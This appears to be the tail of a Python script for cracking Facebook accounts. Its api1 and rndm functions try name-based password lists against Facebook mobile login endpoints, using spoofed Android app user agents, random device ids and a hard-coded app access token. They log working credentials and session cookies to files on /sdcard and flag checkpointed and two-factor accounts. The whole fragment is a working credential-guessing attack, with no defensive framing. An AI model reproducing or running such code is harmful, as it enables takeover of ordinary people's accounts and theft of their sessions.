                    print('\r\r\x1b[38;5;208m[Dark-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
                else:
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
            else:
                continue
        loop += 1
    except Exception as e:
        pass


def api1(ids, names, passlist):
    try:
        global oks, loop, sim_id
        sys.stdout.write(
            '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower(
            )).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "sim_country": "id",
                "network_country": "id",
                "enroll_misauth": "false",
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                "cpl": "true",
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'fb_api_req_friendly_name': 'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-api.facebook.com/method/auth.login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()

            if 'session_key' in po:
                print("")
                print('\r\r\033[1;37m[Dark-OK💚] '+ids+' | '+pas+'\033[1;97m')
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in po.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print("")
                    print('\r\r \033[1;34m[Dark-2F] '+ids+' | '+pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po['error_msg']:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
                else:
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
            else:
                continue
        loop += 1
    except Exception as e:
        pass


def rndm(ids, passlist):
    global loop
    global oks
    sys.stdout.write(
        '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
    sys.stdout.flush()
    try:
        for pas in passlist:
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                "sim_country": "id",
                "network_country": "id",
                "relative_url": "method/auth.login",
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'fb_api_req_friendly_name': 'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                try:
                    uid = po['uid']
                except:
                    uid = ids
                if str(uid) in oks:
                    break
                else:
                    print("")
                    print('\r\r\033[1;37m[Dark-OK💚] ' +
                          str(uid)+' | '+pas+'\033[1;97m')
                    print('[🌺]=COOKIES ⬇')
                    cookies = ""
                    for k,v in po.cookies.items():
                        cookies += str(k) + "=" + str(v) + ";"
                    print('\r\r\033[1;32m %s' % cookies)
                    os.system('espeak -a 300 " Dark, ok, id"')
                    open('/sdcard/Dark-OK.txt', 'a').write(str(uid)+'|'+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in po['error']['message']:
                try:
                    uid = po['error']['error_data']['uid']
                except:
                    uid = ids
                if uid in oks:
                    pass
                else:
                    print('\r\r\x1b[38;5;208m[Dark-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/Dark-CP.txt', 'a').write(str(uid)+'|'+pas+'\n')
                    cps.append(str(ids))
                    break
            else:
                continue
        loop += 1
    except Exception as e:
        pass


try:

    menu()
except requests.exceptions.ConnectionError:
    print('\n No internet connection ...')
    exit()
except Exception as e:
    print(e)
